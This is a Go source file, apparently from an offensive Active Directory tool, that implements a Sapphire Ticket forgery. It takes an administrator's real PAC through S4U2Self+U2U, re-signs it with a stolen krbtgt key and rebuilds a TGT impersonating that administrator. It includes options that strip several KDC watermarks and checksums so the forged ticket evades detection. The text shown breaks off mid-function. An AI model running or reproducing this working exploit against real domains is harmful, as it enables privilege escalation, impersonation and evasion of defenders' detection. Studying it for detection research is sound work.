package forge

import (
	"context"
	"encoding/asn1"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/goobeus/goobeus/pkg/asn1krb5"
	"github.com/goobeus/goobeus/pkg/client"
	"github.com/goobeus/goobeus/pkg/crypto"
	"github.com/goobeus/goobeus/pkg/pac"
	"github.com/goobeus/goobeus/pkg/ticket"
)

// ═══════════════════════════════════════════════════════════════════════════════
// SAPPHIRE TICKET ATTACK - THE STEALTHIEST KERBEROS PRIVILEGE ESCALATION
// ═══════════════════════════════════════════════════════════════════════════════
//
// WHAT IS A SAPPHIRE TICKET?
// ══════════════════════════
// A Sapphire Ticket is a forged TGT that contains a REAL PAC from another user.
// Unlike Golden/Diamond tickets which CREATE or MODIFY PACs, Sapphire tickets
// STEAL a legitimate PAC from an actual high-privilege user, making them
// virtually undetectable by security tools that validate PAC consistency.
//
// ATTACK COMPARISON:
// ══════════════════
//
//   Golden Ticket:
//   ┌─────────────┐     ┌─────────────┐
//   │  Attacker   │ --> │  Fake TGT   │  Creates TGT from scratch
//   │  krbtgt key │     │  Fake PAC   │  PAC groups don't exist in AD
//   └─────────────┘     └─────────────┘  DETECTABLE: PAC vs AD mismatch
//
//   Diamond Ticket:
//   ┌─────────────┐     ┌─────────────┐     ┌─────────────┐
//   │ Request TGT │ --> │ Decrypt TGT │ --> │ Modify PAC  │
//   │ from KDC    │     │ w/ krbtgt   │     │ Add groups  │
//   └─────────────┘     └─────────────┘     └─────────────┘
//   DETECTABLE: Modified groups still don't match AD
//
//   Sapphire Ticket (THIS IMPLEMENTATION):
//   ┌─────────────┐     ┌─────────────┐     ┌─────────────┐     ┌─────────────┐
//   │ 1. Get TGT  │ --> │ 2. S4U2self │ --> │ 3. Extract  │ --> │ 4. Replace  │
//   │ for lowpriv │     │ +U2U to get │     │ REAL PAC    │     │ PAC in TGT  │
//   │ user        │     │ Admin's PAC │     │ from Admin  │     │ w/ Admin's  │
//   └─────────────┘     └─────────────┘     └─────────────┘     └─────────────┘
//   UNDETECTABLE: PAC is 100% legitimate from actual AD user!
//
// WHY IS SAPPHIRE STEALTHIER?
// ═══════════════════════════
//
//   1. REAL PAC: The PAC contains actual groups from AD, not fabricated ones
//   2. VALID SIDS: All Security Identifiers match real AD objects
//   3. AUTHENTIC TIMESTAMPS: PAC creation times are from actual KDC issuance
//   4. NO AD MISMATCH: Security tools comparing PAC to AD see no discrepancy
//   5. SIGNED BY KDC: The PAC was originally signed by the real KDC
//
// TECHNICAL DEEP DIVE:
// ══════════════════════
//
// Step 1: Authenticate as Low-Privilege User
//   - Perform standard AS-REQ/AS-REP exchange
//   - Obtain TGT with session key (encrypted with user's password-derived key)
//   - This TGT contains the low-priv user's PAC
//
// Step 2: S4U2Self + User-to-User (U2U)
//   - S4U2Self: "I want a service ticket for Administrator TO my own SPN"
//   - U2U: "Encrypt the ticket with MY TGT session key (not service key)"
//   - The KDC creates a service ticket with Administrator's real PAC
//   - Since we have the TGT session key, we can decrypt this ticket!
//
// Step 3: Extract Administrator's PAC
//   - Decrypt the U2U service ticket using our TGT session key
//   - Parse the EncTicketPart to find AuthorizationData
//   - Extract the PAC blob (type=128 in AD-IF-RELEVANT)
//   - This PAC contains Administrator's REAL group memberships!
//
// Step 4: Decrypt Original TGT
//   - We have the krbtgt AES key (from DCSync, etc.)
//   - Decrypt the TGT's EncTicketPart (key usage 2)
//   - This gives us access to our TGT's internal structure
//
// Step 5: Replace PAC
//   - Remove the low-priv user's PAC from AuthorizationData
//   - Insert Administrator's PAC in its place
//   - The ticket now has our identity but Admin's privileges!
//
// Step 6: Re-encrypt TGT
//   - Encrypt the modified EncTicketPart with krbtgt key
//   - Rebuild the ticket structure with new ciphertext
//   - Result: A valid TGT that the KDC will accept
//
// PAC STRUCTURE (MS-PAC):
// ═══════════════════════
//
//   PAC_INFO_BUFFER (multiple entries):
//   ┌────────────────────────────────────────┐
//   │ PAC_LOGON_INFO (type 1)                │  ← Groups, RID, Domain SID
//   │ PAC_CLIENT_INFO (type 10)              │  ← Client name, auth time
//   │ PAC_SIGNATURE_DATA (type 6) - Server   │  ← Signed by service key
//   │ PAC_SIGNATURE_DATA (type 7) - KDC      │  ← Signed by krbtgt key
//   │ PAC_REQUESTOR (type 18) - KB5008380   │  ← User SID (newer DCs)
//   │ PAC_ATTRIBUTES_INFO (type 17)          │  ← Ticket attributes
//   └────────────────────────────────────────┘
//
//   The stolen PAC already has valid signatures from:
//   - The service key (in U2U case, our TGT session key)
//   - The KDC's krbtgt key
//
// IMPLEMENTATION NOTES:
// ═════════════════════
//
// ASN.1 GENERALSTRING WORKAROUND:
//   Kerberos uses GeneralString (ASN.1 tag 0x1b) for realm and principal names.
//   Go's encoding/asn1 library defaults to PrintableString (0x13) which KDCs
//   reject. This implementation includes custom ASN.1 marshaling to ensure:
//   - Authenticator.CRealm uses GeneralString (0x1b)
//   - PrincipalName.NameString uses GeneralString (0x1b)
//   - All realm strings in tickets use GeneralString (0x1b)
//
// KEY USAGE VALUES (RFC 4120):
//   - Key Usage 2: Ticket encryption (EncTicketPart with krbtgt key)
//   - Key Usage 7: TGS-REQ PA-TGS-REQ authenticator (with session key)
//   - Key Usage 8: TGS-REP encrypted part (with session key)
//
// DETECTION CONSIDERATIONS:
// ═════════════════════════
//
//   What Sapphire tickets AVOID:
//   ✓ PAC-AD mismatch (PAC is real)
//   ✓ Fabricated group SIDs (groups exist)
//   ✓ Suspicious PAC timestamps (from real issuance)
//
//   What MIGHT still detect Sapphire:
//   ? S4U2Self event correlation (Event 4769 with S4U delegation)
//   ? Network traffic analysis (unusual U2U patterns)
//   ? Behavioral analysis (low-priv user suddenly using Admin ticket)
//
// REFERENCES:
// ═══════════
//   - Impacket ticketer.py: Original Python implementation
//   - MS-KILE: Kerberos Protocol Extensions
//   - MS-PAC: Privilege Attribute Certificate Data Structure
//   - RFC 4120: The Kerberos Network Authentication Service (V5)
//   - Charlie Clark's research on Sapphire tickets
//

// SapphireTicketRequest configures a Sapphire Ticket request.
type SapphireTicketRequest struct {
	// Domain information
	Domain    string
	DomainSID string

	// User to authenticate as (low-priv user)
	Username string
	Password string
	NTHash   []byte

	// User to impersonate (whose PAC we steal)
	Impersonate string // e.g., "Administrator"

	// User ID for PAC_REQUESTOR (KB5008380)
	UserID uint32 // e.g., 1115

	// krbtgt key for signing (required)
	KrbtgtNTHash []byte
	KrbtgtAES256 []byte
	KrbtgtAES128 []byte

	// Optional: existing TGT to use instead of requesting
	TGT        *ticket.Kirbi
	SessionKey []byte

	// Connection
	KDC string

	// StripWatermark rewrites S-1-18-2 → S-1-18-1 in the stolen PAC's ExtraSids
	// before re-signing. The S-1-18-2 SID is added by the KDC to S4U2Self tickets
	// as a watermark and is structurally impossible for a KDC-issued TGT. Stripping
	// it may bypass PAC-content-based sapphire detection.
	StripWatermark bool

	// StripLogonFlags clears the LOGON_RESOURCE_GROUPS (0x200) bit from
	// KERB_VALIDATION_INFO.UserFlags before re-signing. This is a second S4U2Self
	// watermark in the PAC, separate from S-1-18-2.
	StripLogonFlags bool

	// StripPACAttributes rewrites PAC_ATTRIBUTES_INFO.Flags from 0x2
	// (PAC_WAS_GIVEN_IMPLICITLY, S4U2Self) to 0x1 (PAC_WAS_REQUESTED, AS-REQ).
	StripPACAttributes bool

	// StripFullChecksum removes the PAC_FULL_CHECKSUM buffer (type 19) from the
	// PAC. This buffer was added in KB5020805 and is an explicit anti-sapphire
	// measure. Removing it makes the PAC look like it came from a pre-KB5020805
	// DC that doesn't emit the buffer at all.
	StripFullChecksum bool

	// StripTicketChecksum removes the PAC_TICKET_CHECKSUM buffer (type 16).
	// KB5008380 anti-transplantation HMAC over the EncTicketPart; inherited from
	// the stolen S4U2Self ticket and invalid in the forged TGT. WARNING: DCs in
	// strict KB5008380 enforcement mode may reject tickets lacking this buffer.
	StripTicketChecksum bool

	// SyncClientInfoTime rewrites CLIENT_INFO.ClientId FILETIME to match the
	// forged TGT's AuthTime. Legit TGTs have these equal; sapphire inherits
	// the S4U2Self issuance time instead. Consistency-check detections flag this.
	SyncClientInfoTime bool
}

// SapphireTicketResult contains the Sapphire Ticket.
type SapphireTicketResult struct {
	Kirbi          *ticket.Kirbi
	Base64         string
	OriginalUser   string // Low-priv user
	ImpersonatedAs string // User whose PAC we stole
}

// ForgeSapphireTicket creates a Sapphire Ticket.
func ForgeSapphireTicket(ctx context.Context, req *SapphireTicketRequest) (*SapphireTicketResult, error) {
	if req.Domain == "" {
		return nil, fmt.Errorf("domain is required")
	}
	if req.Impersonate == "" {
		return nil, fmt.Errorf("impersonate user is required")
	}

	// Determine krbtgt key
	var krbtgtKey []byte
	var krbtgtEtype int32
	if len(req.KrbtgtAES256) == 32 {
		krbtgtKey = req.KrbtgtAES256
		krbtgtEtype = crypto.EtypeAES256
	} else if len(req.KrbtgtAES128) == 16 {
		krbtgtKey = req.KrbtgtAES128
		krbtgtEtype = crypto.EtypeAES128
	} else if len(req.KrbtgtNTHash) == 16 {
		krbtgtKey = req.KrbtgtNTHash
		krbtgtEtype = crypto.EtypeRC4
	} else {
		return nil, fmt.Errorf("krbtgt key required (--nthash or --aeskey)")
	}

	// Step 1: Get TGT for low-priv user
	fmt.Printf("[*] Step 1: Obtaining TGT for %s...\n", req.Username)
	var tgt *ticket.Kirbi
	var sessionKey []byte

	if req.TGT != nil {
		tgt = req.TGT
		if len(req.SessionKey) > 0 {
			sessionKey = req.SessionKey
		} else if key := tgt.SessionKey(); key != nil {
			sessionKey = key.KeyValue
		}
		fmt.Println("[+] Using provided TGT")
	} else if req.Password != "" {
		// Use NATIVE AS exchange (not gokrb5) for correct session key handling
		fmt.Println("[*] Using native AS exchange (bypassing gokrb5)...")
		nativeResult, err := client.NativeASExchange(ctx, req.Domain, req.Username, req.Password, req.KDC)
		if err != nil {
			return nil, fmt.Errorf("failed to get TGT via native AS: %w", err)
		}

		// Pull the lifetimes the KDC actually granted under domain policy.
		// Falling back to wide defaults only if the parser failed to populate them.
		bootAuthTime := nativeResult.AuthTime
		if bootAuthTime.IsZero() {
			bootAuthTime = time.Now().UTC()
		}
		bootStartTime := nativeResult.StartTime
		if bootStartTime.IsZero() {
			bootStartTime = bootAuthTime
		}
		bootEndTime := nativeResult.EndTime
		if bootEndTime.IsZero() {
			bootEndTime = bootAuthTime.Add(10 * time.Hour)
		}
		bootRenewTill := nativeResult.RenewTill
		if bootRenewTill.IsZero() {
			bootRenewTill = bootAuthTime.Add(7 * 24 * time.Hour)
		}

		// Build kirbi from native result
		tgt = &ticket.Kirbi{
			Cred: &asn1krb5.KRBCred{
				PVNO:    5,
				MsgType: 22,
				Tickets: []asn1krb5.Ticket{nativeResult.Ticket},
			},
			CredInfo: &asn1krb5.EncKRBCredPart{
				TicketInfo: []asn1krb5.KRBCredInfo{
					{
						Key:    nativeResult.SessionKey,
						PRealm: nativeResult.CRealm,
						PName: asn1krb5.PrincipalName{
							NameType:   asn1krb5.NTPrincipal,
							NameString: []string{req.Username}, // Use original user initially
						},
						// Required for ccache conversion:
						SRealm: nativeResult.CRealm,
						SName: asn1krb5.PrincipalName{
							NameType:   asn1krb5.NTSrvInst,
							NameString: []string{"krbtgt", nativeResult.CRealm},
						},
						// Times reflect what the KDC actually granted (domain policy),
						// not hardcoded defaults. The forge step downstream reads these
						// back to inherit the same lifetimes onto the forged TGT.
						AuthTime:  bootAuthTime,
						StartTime: bootStartTime,
						EndTime:   bootEndTime,
						RenewTill: bootRenewTill,
						// Flags: forwardable + proxiable + renewable + initial + pre-authent + enc-pa-rep.
						// Must match what we set on the EncTicketPart (see replacePAC block below).
						Flags: asn1.BitString{
							Bytes:     []byte{0x50, 0xe1, 0x00, 0x00}, // 0x50e10000
							BitLength: 32,
						},
					},
				},
			},
		}

		// CRITICAL: Populate Ticket struct fields (they're empty, only RawBytes is set)
		// This is needed for rebuildTGTFromRawBytes to copy the correct values
		tgt.Cred.Tickets[0].TktVno = 5
		tgt.Cred.Tickets[0].Realm = nativeResult.CRealm
		tgt.Cred.Tickets[0].SName = asn1krb5.PrincipalName{
			NameType:   asn1krb5.NTSrvInst,
			NameString: []string{"krbtgt", nativeResult.CRealm},
		}
		tgt.Cred.Tickets[0].EncPart.EType = nativeResult.SessionKey.KeyType
		sessionKey = nativeResult.SessionKey.KeyValue
		fmt.Printf("[DEBUG] Native AS got session key: etype=%d, len=%d, first8=%x\n",
			nativeResult.SessionKey.KeyType, len(sessionKey), sessionKey[:min(8, len(sessionKey))])
		fmt.Println("[+] Got TGT for low-priv user")
	} else if len(req.NTHash) > 0 {
		// Fall back to gokrb5 for NTLM hash
		tgtReq := &client.TGTRequest{
			Domain:   req.Domain,
			Username: req.Username,
			NTHash:   req.NTHash,
			KDC:      req.KDC,
		}
		result, err := client.AskTGTWithContext(ctx, tgtReq)
		if err != nil {
			return nil, fmt.Errorf("failed to get TGT: %w", err)
		}
		tgt = result.Kirbi
		sessionKey = result.SessionKey.KeyValue
		fmt.Printf("[DEBUG] Sapphire got session key: etype=%d, len=%d, first8=%x\n",
			result.SessionKey.KeyType, len(sessionKey), sessionKey[:min(8, len(sessionKey))])
		fmt.Println("[+] Got TGT for low-priv user")
	} else {
		return nil, fmt.Errorf("password, nthash, or existing TGT required")
	}

	// Step 2: S4U2self + U2U to get impersonated user's PAC
	fmt.Printf("[*] Step 2: S4U2self+U2U to get %s's PAC...\n", req.Impersonate)

	// For U2U, we request a ticket TO OURSELVES (our user principal)
	// The PA-FOR-USER specifies who we want to impersonate
	// The ticket comes back encrypted with our TGT session key (due to ENC-TKT-IN-SKEY)
	serviceName := req.Username // Our own username

	s4uReq := &client.S4U2SelfRequest{
		TGT:          tgt,
		SessionKey:   sessionKey,
		TargetUser:   req.Impersonate,
		TargetDomain: req.Domain,
		ServiceName:  serviceName,
		Domain:       req.Domain,
		KDC:          req.KDC,
	}

	s4uResult, err := client.S4U2SelfWithContext(ctx, s4uReq)
	if err != nil {
		return nil, fmt.Errorf("S4U2self+U2U failed: %w", err)
	}
	fmt.Printf("[+] Got service ticket with %s's PAC\n", req.Impersonate)

	// Step 3: Extract PAC from S4U ticket
	fmt.Println("[*] Step 3: Extracting PAC from S4U ticket...")
	stolenPAC, err := extractPACFromTicket(s4uResult.Kirbi, sessionKey)
	if err != nil {
		return nil, fmt.Errorf("failed to extract PAC: %w", err)
	}
	fmt.Printf("[+] Extracted PAC (%d bytes)\n", len(stolenPAC))

	// DEBUG: Decode and show PAC groups to verify admin membership and S4U2Self indicators
	if decodedPAC, err := pac.DecodePAC(stolenPAC); err == nil {
		fmt.Println("╔══════════════════════════════════════════════════════════════════════════════╗")
		fmt.Println("║ [DEBUG] RAW S4U2Self PAC FROM KDC (before modification)                      ║")
		fmt.Println("╠══════════════════════════════════════════════════════════════════════════════╣")
		fmt.Printf("  User SID:       %s\n", decodedPAC.UserSID)
		fmt.Printf("  Domain Admin:   %v\n", decodedPAC.IsDomainAdmin)
		fmt.Printf("  Enterprise Admin: %v\n", decodedPAC.IsEnterpriseAdmin)
		fmt.Printf("  Builtin Admin:  %v\n", decodedPAC.IsBuiltinAdmin)
		fmt.Println("  ────────────────────────────────────────────────────────────────────────────")
		fmt.Printf("  Groups (%d):\n", len(decodedPAC.Groups))
		for _, g := range decodedPAC.Groups {
			fmt.Printf("    - %s\n", g)
		}
		if len(decodedPAC.ExtraSIDs) > 0 {
			fmt.Println("  ────────────────────────────────────────────────────────────────────────────")
			fmt.Printf("  Extra SIDs (%d):\n", len(decodedPAC.ExtraSIDs))
			for _, s := range decodedPAC.ExtraSIDs {
				label := ""
				if s == "S-1-18-1" {
					label = " ← AUTHENTICATION AUTHORITY (normal AS-REQ)"
				} else if s == "S-1-18-2" {
					label = " ← SERVICE ASSERTED (S4U2Self!) ⚠️"
				}
				fmt.Printf("    - %s%s\n", s, label)
			}
		}
		fmt.Println("  ────────────────────────────────────────────────────────────────────────────")
		fmt.Println("  S4U2Self DETECTION ANALYSIS:")

		// Show UserFlags
		fmt.Printf("    UserFlags: 0x%X (%d)\n", decodedPAC.UserFlags, decodedPAC.UserFlags)
		if decodedPAC.UserFlags&0x20 != 0 {
			fmt.Println("      ✓ LOGON_EXTRA_SIDS (0x20) - Has extra SIDs")
		}
		if decodedPAC.UserFlags&0x200 != 0 {
			fmt.Println("      ⚠️  LOGON_RESOURCE_GROUPS (0x200) - S4U2Self adds this! ⚠️")
		}

		// Show S-1-18-x analysis
		if decodedPAC.HasServiceAssertedIdentity {
			fmt.Println("    ⚠️  S-1-18-2 PRESENT - This PAC was obtained via S4U2Self!")
			fmt.Println("    ⚠️  This is a DETECTION VECTOR - KDC watermarks S4U2Self tickets!")
		} else if decodedPAC.HasAuthAssertedIdentity {
			fmt.Println("    ✓  S-1-18-1 present - Normal authentication authority")
		} else {
			fmt.Println("    ?  Neither S-1-18-1 nor S-1-18-2 found (parser may have missed it)")
		}
		fmt.Println("╚══════════════════════════════════════════════════════════════════════════════╝")
	} else {
		fmt.Printf("[DEBUG] Failed to decode PAC for analysis: %v\n", err)
	}

	// Step 3.5: Add KB5008380 buffers (PAC_REQUESTOR and PAC_ATTRIBUTES_INFO)
	// EDUCATIONAL: KB5008380 Enforcement
	// Since July 2022, Domain Controllers enforce PAC_REQUESTOR validation.
	// S4U2Self service tickets don't have this buffer, so we must add it.
	fmt.Println("[*] Step 3.5: Adding KB5008380 buffers (PAC_REQUESTOR, PAC_ATTRIBUTES_INFO)...")

	// Extract user SID from the stolen PAC's LOGON_INFO
	userSID, err := pac.ExtractUserSIDFromPAC(stolenPAC)
	if err != nil {
		fmt.Printf("[!] Warning: could not extract user SID: %v\n", err)
		fmt.Println("[!] Proceeding without PAC_REQUESTOR - may fail on KB5008380 enforcing DCs")
	} else {
		fmt.Printf("[+] Extracted user SID: %s\n", userSID.String())
		stolenPAC, err = pac.AddKB5008380Buffers(stolenPAC, userSID)
		if err != nil {
			fmt.Printf("[!] Warning: failed to add KB5008380 buffers: %v\n", err)
		}
	}

	// Step 3.75: Optionally strip the S-1-18-2 watermark from the stolen PAC.
	// S-1-18-2 (SERVICE_ASSERTED_IDENTITY) is the KDC's watermark for S4U2Self
	// tickets. A TGT carrying it is structurally impossible from a legitimate AS-REQ,
	// so it can be used by detections to identify sapphire tickets regardless of
	// tool-specific wire fingerprints. Rewriting to S-1-18-1 makes the PAC look
	// like it came from a normal AS authentication.
	if req.StripWatermark {
		fmt.Println("[*] Step 3.75: Stripping S-1-18-2 watermark (rewriting to S-1-18-1)...")
		var n int
		stolenPAC, n = pac.RewriteServiceAssertedIdentity(stolenPAC)
		if n > 0 {
			fmt.Printf("[+] Rewrote %d S-1-18-2 → S-1-18-1\n", n)
		} else {
			fmt.Println("[!] No S-1-18-2 found to rewrite (PAC may not carry the watermark)")
		}
	}

	// Step 3.76: Optionally clear LOGON_RESOURCE_GROUPS bit in UserFlags.
	// This is a second S4U2Self watermark in the PAC — the KDC sets this bit on
	// S4U2Self responses, and a legit AS-REQ TGT never has it. Clearing it makes
	// the PAC's UserFlags look like a normal AS result.
	if req.StripLogonFlags {
		fmt.Println("[*] Step 3.76: Clearing LOGON_RESOURCE_GROUPS bit from UserFlags...")
		var n int
		stolenPAC, n = pac.StripLogonResourceGroupsFlag(stolenPAC)
		if n > 0 {
			fmt.Printf("[+] Cleared LOGON_RESOURCE_GROUPS in %d UserFlags field(s)\n", n)
		} else {
			fmt.Println("[!] No UserFlags=0x220 pattern found (PAC may not carry this watermark)")
		}
	}

	// Step 3.77: Optionally rewrite PAC_ATTRIBUTES_INFO.Flags from
	// PAC_WAS_GIVEN_IMPLICITLY (0x2, S4U2Self) to PAC_WAS_REQUESTED (0x1, AS-REQ).
	if req.StripPACAttributes {
		fmt.Println("[*] Step 3.77: Rewriting PAC_ATTRIBUTES_INFO flags 0x2 → 0x1...")
		var n int
		stolenPAC, n = pac.RewritePACAttributesRequested(stolenPAC)
		if n > 0 {
			fmt.Printf("[+] Rewrote PAC_ATTRIBUTES_INFO flags in %d buffer(s)\n", n)
		} else {
			fmt.Println("[!] PAC_ATTRIBUTES_INFO flags already = 0x1 or buffer absent")
		}
	}

	// Step 3.78: Optionally remove PAC_FULL_CHECKSUM (type 19) buffer.
	// Added in KB5020805 (Nov 2022) as an explicit anti-sapphire measure.
	// Removing makes the PAC look pre-KB5020805.
	if req.StripFullChecksum {
		fmt.Println("[*] Step 3.78: Removing PAC_FULL_CHECKSUM (type 19) buffer...")
		before := len(stolenPAC)
		var n int
		stolenPAC, n = pac.RemovePACFullChecksum(stolenPAC)
		if n > 0 {
			fmt.Printf("[+] Removed PAC_FULL_CHECKSUM buffer (PAC size %d → %d)\n", before, len(stolenPAC))
		} else {
			fmt.Println("[!] No PAC_FULL_CHECKSUM buffer present (DC may pre-date KB5020805)")
		}
	}

	// Step 3.79: Optionally remove PAC_TICKET_CHECKSUM (type 16) buffer.
	// KB5008380 HMAC over EncTicketPart; inherited from S4U2Self, now stale
	// after PAC transplantation. Removing makes the PAC look pre-KB5008380.
	// WARNING: may cause auth failures on DCs in strict KB5008380 enforcement.
	if req.StripTicketChecksum {
		fmt.Println("[*] Step 3.79: Removing PAC_TICKET_CHECKSUM (type 16) buffer...")
		before := len(stolenPAC)
		var n int
		stolenPAC, n = pac.RemovePACTicketChecksum(stolenPAC)
		if n > 0 {
			fmt.Printf("[+] Removed PAC_TICKET_CHECKSUM buffer (PAC size %d → %d)\n", before, len(stolenPAC))
		} else {
			fmt.Println("[!] No PAC_TICKET_CHECKSUM buffer present")
		}
	}

	// Step 3.81: Optionally sync CLIENT_INFO.ClientId FILETIME to the TGT's
	// AuthTime. Legit TGTs have CLIENT_INFO.ClientId == EncTicketPart.AuthTime;
	// sapphire inherits the S4U2Self issuance time which is seconds off. A
	// consistency-check detection would flag the mismatch.
	if req.SyncClientInfoTime {
		fmt.Println("[*] Step 3.81: Syncing CLIENT_INFO FILETIME to ticket AuthTime...")
		encTkt, err := decryptTGT(tgt, krbtgtKey, krbtgtEtype)
		if err != nil {
			fmt.Printf("[!] Could not decrypt TGT to extract AuthTime: %v\n", err)
		} else {
			var n int
			stolenPAC, n = pac.SyncClientInfoTimestamp(stolenPAC, encTkt.AuthTime)
			if n > 0 {
				fmt.Printf("[+] Synced CLIENT_INFO ClientId to %s\n", encTkt.AuthTime.Format(time.RFC3339))
			} else {
				fmt.Println("[!] CLIENT_INFO buffer not present or too small")
			}
		}
	}

	// Step 4: Decrypt original TGT with krbtgt key (get RAW bytes to preserve GeneralString)
	fmt.Println("[*] Step 4: Decrypting original TGT with krbtgt key...")
	decryptedTGTBytes, err := decryptTGTRaw(tgt, krbtgtKey, krbtgtEtype)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt TGT: %w", err)
	}
	fmt.Printf("[+] TGT decrypted (%d bytes)\n", len(decryptedTGTBytes))

	// Step 5: Re-sign PAC with krbtgt keys (preserving original checksum types)
	// EDUCATIONAL: The PAC was originally signed with S4U2Self session key.
	// We must re-sign it with the krbtgt key for it to be valid in the TGT.
	// Unlike the old approach, we now PRESERVE the original checksum types
	// and use the appropriate key for each (NTLM for RC4, AES for AES).
	fmt.Println("[*] Step 5: Re-signing PAC with krbtgt keys...")
	pac.DebugPAC(stolenPAC) // Debug before re-signing

	// Use the new function that preserves checksum types (like Impacket)
	var resignedPAC []byte
	if len(req.KrbtgtNTHash) == 16 || len(req.KrbtgtAES256) == 32 {
		// Use the Impacket-compatible re-signing with both keys when available
		resignedPAC, err = pac.ResignPACWithKeys(stolenPAC, req.KrbtgtNTHash, req.KrbtgtAES256)
		if err != nil {
			// Fall back to single-key signing if the PAC doesn't need both
			fmt.Printf("[!] ResignPACWithKeys failed (%v), falling back to single key\n", err)
			resignedPAC, err = pac.ResignPAC(stolenPAC, krbtgtKey, krbtgtEtype)
			if err != nil {
				return nil, fmt.Errorf("failed to re-sign PAC: %w", err)
			}
		}
	} else {
		// Single key only
		resignedPAC, err = pac.ResignPAC(stolenPAC, krbtgtKey, krbtgtEtype)
		if err != nil {
			return nil, fmt.Errorf("failed to re-sign PAC: %w", err)
		}
	}
	fmt.Printf("[+] PAC re-signed with krbtgt key(s)\n")
	pac.DebugPAC(resignedPAC) // Debug after re-signing

	// Step 6: Replace PAC in TGT
	// CRITICAL: We MUST use the struct-based approach because:
	// 1. We need to update the cname in EncTicketPart to the impersonated user
	// 2. The raw bytes approach only replaces the PAC but keeps the original cname
	// 3. Without matching cname, the service will reject the ticket (Access Denied)
	fmt.Println("[*] Step 6: Replacing PAC in TGT...")
	fmt.Println("[*] Using struct-based approach to update both PAC and cname...")

	// Force struct-based approach - the raw bytes approach is buggy (doesn't update cname)
	var modifiedEncPartBytes []byte
	{
		// Use the struct approach
		decryptedTGT, err := decryptTGT(tgt, krbtgtKey, krbtgtEtype)
		if err != nil {
			return nil, fmt.Errorf("failed to decrypt TGT: %w", err)
		}

		// DEBUG: Show what's in the original AuthorizationData
		fmt.Printf("[DEBUG] Original EncTicketPart AuthorizationData: %d entries\n", len(decryptedTGT.AuthorizationData))
		for i, ad := range decryptedTGT.AuthorizationData {
			fmt.Printf("[DEBUG]   [%d] ADType=%d, DataLen=%d\n", i, ad.ADType, len(ad.ADData))
		}

		modifiedEncPart, err := replacePAC(decryptedTGT, resignedPAC)
		if err != nil {
			return nil, fmt.Errorf("failed to replace PAC: %w", err)
		}

		// DEBUG: Show what's in the modified AuthorizationData
		fmt.Printf("[DEBUG] Modified EncTicketPart AuthorizationData: %d entries\n", len(modifiedEncPart.AuthorizationData))
		for i, ad := range modifiedEncPart.AuthorizationData {
			fmt.Printf("[DEBUG]   [%d] ADType=%d, DataLen=%d\n", i, ad.ADType, len(ad.ADData))
		}

		// CRITICAL: Change the cname in EncTicketPart to the impersonated user!
		// Without this, the service will see cname mismatch between ticket and authenticator
		modifiedEncPart.CName = asn1krb5.PrincipalName{
			NameType:   asn1krb5.NTPrincipal,
			NameString: []string{req.Impersonate},
		}
		fmt.Printf("[*] Changed EncTicketPart cname to: %s\n", req.Impersonate)

		// Align flags and lifetime with the CredInfo wrapper. Do NOT touch
		// AuthTime/StartTime here: MS-KILE requires EncTicketPart.AuthTime
		// to equal PAC_CLIENT_INFO.LogonTime. The stolen PAC's LogonTime was
		// stamped by the KDC during S4U2Self, so changing AuthTime breaks
		// PAC validation (KRB_AP_ERR_MODIFIED). Only EndTime, RenewTill,
		// and Flags are safe to override — none of them are bound to PAC data.
		modifiedEncPart.Flags = asn1.BitString{
			Bytes:     []byte{0x50, 0xe1, 0x00, 0x00}, // fwd+proxy+renew+init+preauth+enc-pa-rep
			BitLength: 32,
		}
		// Inherit EndTime / RenewTill from the bootstrap TGT so the forged
		// ticket's lifetime matches the domain's actual policy, not a
		// hardcoded +10h/+7d that would stand out on tighter or looser policies.
		// The bootstrap kirbi's TicketInfo[0] is populated either from the
		// AS-REP (NativeASExchange branch) or the gokrb5 result.
		bootInfo := tgt.CredInfo.TicketInfo[0]
		bootEndOffset := bootInfo.EndTime.Sub(bootInfo.AuthTime)
		bootRenewOffset := bootInfo.RenewTill.Sub(bootInfo.AuthTime)
		if bootEndOffset <= 0 {
			bootEndOffset = 10 * time.Hour
		}
		if bootRenewOffset <= 0 {
			bootRenewOffset = 7 * 24 * time.Hour
		}
		modifiedEncPart.EndTime = modifiedEncPart.AuthTime.Add(bootEndOffset)
		modifiedEncPart.RenewTill = modifiedEncPart.AuthTime.Add(bootRenewOffset)

		// Mirror the EncTicketPart fields into the outer CredInfo/ccache wrapper
		// so klist, describe, and Mimikatz see the same values the KDC does.
		if tgt.CredInfo != nil && len(tgt.CredInfo.TicketInfo) > 0 {
			ti := &tgt.CredInfo.TicketInfo[0]
			ti.Flags = modifiedEncPart.Flags
			ti.AuthTime = modifiedEncPart.AuthTime
			ti.StartTime = modifiedEncPart.StartTime
			ti.EndTime = modifiedEncPart.EndTime
			ti.RenewTill = modifiedEncPart.RenewTill
		}

		// EncTicketPart ::= [APPLICATION 3] SEQUENCE { ... }
		// Go's asn1.Marshal produces a SEQUENCE for struct types
		sequenceBytes, err := asn1.Marshal(*modifiedEncPart)
		if err != nil {
			return nil, fmt.Errorf("failed to marshal EncTicketPart SEQUENCE: %w", err)
		}

		// Wrap with APPLICATION 3 (0x63 = 0x60 | 0x03 = APPLICATION + CONSTRUCTED + 3)
		marshaled := []byte{0x63}
		marshaled = append(marshaled, buildLen(len(sequenceBytes))...)
		marshaled = append(marshaled, sequenceBytes...)

		// Fix PrintableString (0x13) to GeneralString (0x1b) for Kerberos compatibility
		modifiedEncPartBytes = fixPrintableToGeneralString(marshaled)
		fmt.Println("[+] PAC replaced and cname updated")
	}

	// Legacy raw bytes code removed - it doesn't update cname which breaks authorization
	_ = decryptedTGTBytes // silence unused warning

	// Step 7: Re-encrypt and rebuild TGT
	// EDUCATIONAL: We encrypt the modified EncTicketPart with krbtgt key (key usage 2).
	// This creates a valid TGT that the KDC will accept.
	fmt.Println("[*] Step 7: Re-encrypting TGT with krbtgt key...")
	fmt.Println("    EDUCATIONAL: Encrypting EncTicketPart with krbtgt key (key usage 2)")
	fmt.Println("    This completes the Sapphire attack - we now have a TGT with Admin's PAC!")
	newTGT, err := rebuildTGTFromRawBytes(tgt, modifiedEncPartBytes, krbtgtKey, krbtgtEtype)
	if err != nil {
		return nil, fmt.Errorf("failed to rebuild TGT: %w", err)
	}
	fmt.Println("[+] Sapphire TGT forged successfully!")

	// Update CredInfo to use impersonated user's name (for ccache export)
	// The TGT now contains Admin's PAC, so the client principal should be Admin too
	if newTGT.CredInfo != nil && len(newTGT.CredInfo.TicketInfo) > 0 {
		newTGT.CredInfo.TicketInfo[0].PName = asn1krb5.PrincipalName{
			NameType:   asn1krb5.NTPrincipal,
